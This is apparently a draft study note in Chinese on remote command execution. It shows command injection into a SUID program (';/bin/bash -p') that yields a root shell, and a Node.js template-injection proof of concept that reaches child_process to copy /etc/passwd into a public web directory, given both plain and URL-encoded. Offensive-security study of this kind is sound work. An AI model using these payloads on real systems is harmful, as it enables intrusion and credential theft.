---
title: "remote command/code execute"
draft: true
sidebar: false
outline: 2
---

# RCE

[RCE](../common.md#rce)漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。

**RCE(远程系统命令执行)**：程序对输入检测不到位，导致攻击者能够执行**非预期的**代码或系统命令。从而能够获取 Webshell ，取得对主机的控制权限。**每次入侵和 Web 应用程序渗透测试中必须寻找的。**

**受害者主体**：网站服务器。

---

Linux系统中允许同时执行多条命令的符号

- `;` 连接多条命令
- `&&` 前面命令执行成功了才执行后面的命令
- `||` 前面命令执行失败了才执行后面的命令
- `|` 前面命令输出结果作为后面命令的输入内容
- `&` 将前面的命令转入后台执行，并同时执行后面的命令

```bash
mike@pwnlab:/home/mike$ strings msg2root | grep echo
/bin/echo %s >> /root/messages.txt   

mike@pwnlab:/home/mike$ ./msg2root
Message for root: hello;/bin/bash -p
hello
bash-4.3# id
uid=1002(mike) gid=1002(mike) euid=0(root) egid=0(root) groups=0(root),1003(kane)
```

## javascript与RCE

在 Node.js 项目中，使用 JavaScript 作为开发语言，如果出现模版注入漏洞，往
往会升级成为 RCE（远程命令执行）。

要获得 shell 执行，我们必须找到正确的函数来在 Node/JavaScript 中执行。

JavaScript 中有一个特殊的对象，称为全局对象（Global Object），它及其所有属性都可以在程序的任何地方访问，即**全局变量**。

在浏览器 JavaScript 中，通常 window 是全局对象， 而 Node.js 中的全局对象是 global，所有全局变量（除了 global 本身以外）都是 global 对象的属性。

<span style="font-size: 19px;">**PoC**</span>

**搜索 Require 方法，遍历 Global**

- each val,index in global
- p=index

```txt
%0a%65%61%63%68%20%76%61%6c%2c%69%6e%64%65%78%20%69%6e%20%67%6c%6f%62%61%6c%0a%20%70%3d%69%6e%64%65%78
```
**遍历 global.process**

- each val,index in global.process
- p=index

```txt
%0a%65%61%63%68%20%76%61%6c%2c%69%6e%64%65%78%20%69%6e%20%67%6c%6f%62%61%6c%2e%70%72%6f%63%65%73%73%0a%20%70%3d%69%6e%64%65%78
```
**遍历 global.process.mainModule**

- each val,index in global.process.mainModule
- p=index

```txt
%0a%65%61%63%68%20%76%61%6c%2c%69%6e%64%65%78%20%69%6e%20%67%6c%6f%62%61%6c%2e%70%72%6f%63%65%73%73%2e%6d%61%69%6e%4d%6f%64%75%6c%65%0a%20%20%70%3d%69%6e%64%65%78%0a
```
**RCE**

```javascript

- var x = global.process.mainModule.require
- x('child_process').exec('cat /etc/passwd >> /opt/web/chatSupportSystems/public/account.txt')
```
```txt
%0a%2d%20%76%61%72%20%78%20%3d%20%67%6c%6f%62%61%6c%2e%70%72%6f%63%65%73%73%2e%6d%61%69%6e%4d%6f%64%75%6c%65%2e%72%65%71%75%69%72%65%0a%2d%20%78%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%20%3e%3e%20%2f%6f%70%74%2f%77%65%62%2f%63%68%61%74%53%75%70%70%6f%72%74%53%79%73%74%65%6d%73%2f%70%75%62%6c%69%63%2f%61%63%63%6f%75%6e%74%2e%74%78%74%27%29
```

## tplmap

[tplmap](https://github.com/epinna/tplmap)